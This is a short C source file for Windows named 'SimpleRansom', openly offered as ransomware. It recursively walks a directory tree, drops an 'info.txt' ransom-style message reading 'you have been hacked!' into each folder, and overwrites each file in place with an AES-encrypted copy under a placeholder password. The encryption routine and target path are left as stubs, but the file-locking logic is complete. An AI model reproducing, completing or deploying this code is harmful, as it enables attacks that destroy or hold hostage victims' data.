#include <windows.h>
#include <stdio.h>  
#include <stdlib.h>
#include "SimpleRansom.h"


int SimpleRansom() {
    ListDirectoryContents("[Path]");
	return 1;
}

bool ListDirectoryContents(const char *sDir)
{
    WIN32_FIND_DATA fdFile;
    HANDLE hFind = NULL;

    char sPath[2048];

    //Specify a file mask. *.* = We want everything!
    sprintf(sPath, "%s\\*.*", sDir);

    if((hFind = FindFirstFile(sPath, &fdFile)) == INVALID_HANDLE_VALUE)
    {
        printf("Path not found: [%s]\n", sDir);
        return FALSE;
    }

    do
    {
        //Find first file will always return "."
        //    and ".." as the first two directories.
        if(strcmp(fdFile.cFileName, ".") != 0
                && strcmp(fdFile.cFileName, "..") != 0)
        {
            //Build up our file path using the passed in
            //  [sDir] and the file/foldername we just found:
            sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);

            //Is the entity a File or Folder?
            if(fdFile.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
            {
                printf("Directory: %s\n", sPath);
                char tmp[2048];
                strcpy(tmp, sPath);
                strcat(tmp, "\\info.txt");
                FILE *fl = fopen(tmp, "w");
                fputs("you have been hacked!", fl);
                fclose(fl);
                ListDirectoryContents(sPath); //Recursion, I love it!
            }
            else{
                FILE *fl = NULL;
                if ((fl = fopen(sPath, "rb")) != NULL) {
                    fseek(fl, 0, SEEK_END);
                    DWORD len = ftell(fl);
                    BYTE *ret = (BYTE*)malloc(len);
                    fseek(fl, 0, SEEK_SET);
                    fread(ret, 1, len, fl);
                    fclose(fl);
                    ret = AES_Encrypt(ret, len, "[Password]");
                    FILE* file2 = fopen(sPath, "wb");
                    fwrite(ret, 1, len, file2);
                    fclose(file2);
                    printf("File: %s\n", sPath);
                }
            }
        }
    }
    while(FindNextFile(hFind, &fdFile)); //Find the next file.

    FindClose(hFind); //Always, Always, clean things up!

    return TRUE;
}